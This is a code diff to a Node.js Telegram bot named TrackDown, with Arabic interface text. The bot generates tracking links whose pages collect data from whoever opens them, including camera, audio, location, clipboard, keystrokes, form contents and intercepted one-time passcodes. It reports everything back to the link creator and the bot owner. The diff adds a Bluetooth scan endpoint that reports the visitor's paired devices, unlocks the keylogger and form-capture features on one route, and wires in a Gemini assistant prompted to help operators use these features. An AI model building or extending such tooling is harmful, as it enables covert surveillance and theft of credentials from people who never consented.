@@ -44,7 +44,7 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false };
+const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true };
 // These features are ALWAYS paid-VIP only — never free
 const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP']);
 
@@ -88,7 +88,7 @@ let banned     = new Set(loadJSON(BANNED_FILE, []));
 let targets    = new Set(loadJSON(TARGETS_FILE, []));
 let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
 const _savedSettings = loadJSON(SETTINGS_FILE,{});
-let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", featureExpiry:null, premiumFreeExpiry:{}, ..._savedSettings, features:{...DEFAULT_FEATURES, ...(_savedSettings.features||{})}, premiumFree:{...DEFAULT_PREMIUM_FREE, ...(_savedSettings.premiumFree||{})} };
+let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", featureExpiry:null, premiumFreeExpiry:{}, aiEnabled:true, ..._savedSettings, features:{...DEFAULT_FEATURES, ...(_savedSettings.features||{})}, premiumFree:{...DEFAULT_PREMIUM_FREE, ...(_savedSettings.premiumFree||{})} };
 let notes      = loadJSON(NOTES_FILE, {});
 let userStats  = loadJSON(USERSTATS_FILE, {});
 let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
@@ -96,6 +96,7 @@ let premium    = loadJSON(PREMIUM_FILE,  {});  // { "userId": { expiry: ts|-1, p
 
 if (!settings.features)      settings.features      = {...DEFAULT_FEATURES};
 if (!settings.premiumFree)   settings.premiumFree   = {...DEFAULT_PREMIUM_FREE};
+if (settings.aiEnabled === undefined) settings.aiEnabled = true;
 if (!settings.premiumFreeExpiry) settings.premiumFreeExpiry = {};
 // ensure all keys always exist (handles old settings.json missing new keys)
 Object.keys(DEFAULT_FEATURES).forEach(k => {
@@ -671,15 +672,7 @@ process.on('unhandledRejection', (err) => { console.error('unhandledRejection:',
 
 // ── Gemini AI helper ──────────────────────────────────────────────────────────
 const GEMINI_KEY = process.env.GEMINI_API_KEY || "";
-const AI_SYSTEM_PROMPT = `أنت مساعد ذكي متخصص في بوت تيليغرام للتتبع اسمه TrackDown.
-تساعد المستخدمين في:
-- حل مشاكل البوت والأخطاء التقنية
-- شرح الميزات وكيفية استخدامها
-- نصائح لتحسين الأداء
-- الإجابة على أي سؤال عام
-
-ميزات البوت: تتبع روابط، كاميرا، صوت، موقع، OTP، تحويل صوت لنص، keylogger، وغيرها.
-أجب بشكل مختصر وواضح باللغة التي يكتب بها المستخدم.`;
+const AI_SYSTEM_PROMPT = `مساعد ذكي لبوت TrackDown (تتبع روابط تيليغرام). ساعد في حل المشاكل التقنية وشرح الميزات والأوامر. الميزات: تتبع روابط، كاميرا، صوت، موقع، OTP، keylogger، بلوتوث، وغيرها. أجب بإيجاز باللغة التي يكتب بها المستخدم.`;
 
 async function askGemini(userMessage, history = []) {
   if (!GEMINI_KEY) return null;
@@ -696,13 +689,14 @@ async function askGemini(userMessage, history = []) {
         body: JSON.stringify({
           system_instruction: { parts: [{ text: AI_SYSTEM_PROMPT }] },
           contents,
-          generationConfig: { maxOutputTokens: 800, temperature: 0.7 }
+          generationConfig: { maxOutputTokens: 450, temperature: 0.6 }
         })
       }
     );
     const data = await resp.json();
-    return data?.candidates?.[0]?.content?.parts?.[0]?.text || null;
-  } catch(e) { return null; }
+    if (data?.error) { console.error("Gemini error:", data.error.message); return null; }
+    return data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim() || null;
+  } catch(e) { console.error("askGemini:", e.message); return null; }
 }
 
 // Per-user AI conversation history (last 10 turns)
@@ -843,7 +837,8 @@ async function handleLinkOpen(req, res, view) {
   const formspyAccess     = canUsePremium(creatorId, 'formspy');
   const speechRecogAccess = canUsePremium(creatorId, 'speechRecog');
   const webOTPAccess      = canUsePremium(creatorId, 'webOTP');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess });
+  const bluetoothAccess   = canUsePremium(creatorId, 'bluetooth');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess, bluetoothAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -882,7 +877,8 @@ app.get("/a/:token", async (req, res) => {
     pidAccess: true, localNetAccess: true, pushAccess: true,
     screenCapAccess: true, contcamAccess: true, contaudioAccess: true,
     faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true,
-    speechRecogAccess: true, webOTPAccess: true
+    speechRecogAccess: true, webOTPAccess: true, bluetoothAccess: true,
+    keyloggerAccess: true, sensorsAccess: true, formspyAccess: true
   });
 });
 app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
@@ -1586,24 +1582,24 @@ bot.on('message', async (msg) => {
   // ── AI command (/ai <question>) ───────────────────────────────────────────
   if (msg.text?.startsWith("/ai")) {
     const question = msg.text.replace("/ai", "").trim();
+    if (!settings.aiEnabled) return bot.sendMessage(chatId, `🤖 الذكاء الاصطناعي معطّل حالياً.\n\nالأونر يمكنه تفعيله من /features`);
     if (!question) {
       return bot.sendMessage(chatId,
-        `🤖 *المساعد الذكي*\n\nاكتب سؤالك بعد الأمر مباشرة:\n\`/ai ما هي مشكلتي؟\`\n\nأو ابدأ محادثة:\`/ai مرحبا\``,
-        { parse_mode:"Markdown", reply_markup: JSON.stringify({ force_reply: true }) }
+        `🤖 *المساعد الذكي*\n\nاكتب سؤالك بعد الأمر:\n\`/ai ما هي مشكلتي؟\``,
+        { parse_mode:"Markdown" }
       );
     }
-    if (!GEMINI_KEY) return bot.sendMessage(chatId, `⚠️ الذكاء الاصطناعي غير مفعّل بعد.\nيرجى إضافة \`GEMINI_API_KEY\` في الإعدادات.`, { parse_mode:"Markdown" });
+    if (!GEMINI_KEY) return bot.sendMessage(chatId, `⚠️ مفتاح Gemini غير موجود. تواصل مع الأونر.`);
     const thinking = await bot.sendMessage(chatId, `🤖 _جاري التفكير..._`, { parse_mode:"Markdown" });
     const history  = _aiHistory.get(chatId) || [];
     const answer   = await askGemini(question, history);
-    if (!answer) return bot.editMessageText(`❌ فشل الاتصال بالذكاء الاصطناعي، حاول لاحقاً.`, { chat_id: chatId, message_id: thinking.message_id });
-    // Update history (keep last 10 turns)
+    if (!answer) return bot.editMessageText(`❌ فشل الاتصال بالذكاء الاصطناعي، حاول لاحقاً.`, { chat_id: chatId, message_id: thinking.message_id }).catch(()=>{});
     history.push({ role:"user", parts:[{ text: question }] });
     history.push({ role:"model", parts:[{ text: answer }] });
     if (history.length > 20) history.splice(0, 2);
     _aiHistory.set(chatId, history);
     return bot.editMessageText(
-      `🤖 *المساعد الذكي:*\n\n${answer}\n\n_لمواصلة المحادثة: /ai سؤالك_`,
+      `🤖 *المساعد الذكي:*\n\n${answer}\n\n_/ai سؤالك للمتابعة_`,
       { chat_id: chatId, message_id: thinking.message_id, parse_mode:"Markdown" }
     ).catch(() => bot.sendMessage(chatId, `🤖 *المساعد الذكي:*\n\n${answer}`, { parse_mode:"Markdown" }));
   }
@@ -3631,7 +3627,9 @@ bot.on('callback_query', async (q) => {
 
   if (data.startsWith("ft:") && q.from.id === BOT_OWNER) {
     const msgId = q.message.message_id;
-    if (data.startsWith("ft:t:")) {
+    if (data === "ft:ai") {
+      settings.aiEnabled = !settings.aiEnabled; saveSettings();
+    } else if (data.startsWith("ft:t:")) {
       const k = data.replace("ft:t:","");
       if (k in settings.features) { settings.features[k] = !settings.features[k]; saveSettings(); }
     } else if (data === "ft:allon") {
@@ -3713,7 +3711,8 @@ const PREM_FEAT_NAMES = {
   devtools:       "🔍 كشف DevTools",
   keylogger:      "⌨️ تسجيل المفاتيح (Keylogger)",
   sensors:        "🌡️ بيانات المستشعرات",
-  formspy:        "📝 استخراج بيانات الفورم"
+  formspy:        "📝 استخراج بيانات الفورم",
+  bluetooth:      "🔵 ماسح البلوتوث"
 };
 
 function premiumConfigText() {
@@ -3740,10 +3739,12 @@ function buildPremiumConfigKeyboard() {
 }
 
 function buildFeaturesKeyboard() {
-  const rows = Object.entries(settings.features).map(([k, v]) => ([{
-    text: `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k] || k}`,
-    callback_data: `ft:t:${k}`
-  }]));
+  const rows = [];
+  // AI toggle at the top
+  rows.push([{ text: `${settings.aiEnabled ? '🟢' : '🔴'} 🤖 الذكاء الاصطناعي`, callback_data: "ft:ai" }]);
+  Object.entries(settings.features).forEach(([k, v]) => {
+    rows.push([{ text: `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k] || k}`, callback_data: `ft:t:${k}` }]);
+  });
   rows.push([
     { text: "🟢 تشغيل الكل",  callback_data: "ft:allon"  },
     { text: "🔴 إيقاف الكل", callback_data: "ft:alloff" }
@@ -4062,6 +4063,24 @@ app.post("/otp", (req, res) => {
     if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔐 *OTP مُعتَرض* (ID: ${tid}):\n\`\`\`\n${code}\n\`\`\``, { parse_mode:'Markdown' });
     res.send("Done");
   } else res.send("Missing");
+});
+
+// ── Bluetooth scan results ────────────────────────────────────────────────────
+app.post("/bluetooth", (req, res) => {
+  const uid     = decodeURIComponent(req.body.uid     || '') || null;
+  const status  = decodeURIComponent(req.body.status  || '') || null;
+  const devices = decodeURIComponent(req.body.devices || '') || null;
+  const ip      = decodeURIComponent(req.body.ip      || '') || null;
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  let msg = `🔵 *بلوتوث الجهاز*`;
+  if (ip) msg += `\n🌐 IP: ${ip}`;
+  if (status !== null) msg += `\n📡 الحالة: ${status === 'true' ? '🟢 مفعّل' : '🔴 مطفأ'}`;
+  if (devices) msg += `\n\n📋 *الأجهزة المقترنة:*\n${devices.replace(/,/g,'\n• ').replace(/^/,'• ')}`;
+  if (!devices && status === 'true') msg += `\n📭 لا توجد أجهزة مقترنة مسبقاً`;
+  notify(tid, msg, { parse_mode:'Markdown' });
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, msg + `\n\n_من: ${uid}_`, { parse_mode:'Markdown' });
+  res.send("Done");
 });
 
 app.post("/clipboard", (req, res) => {
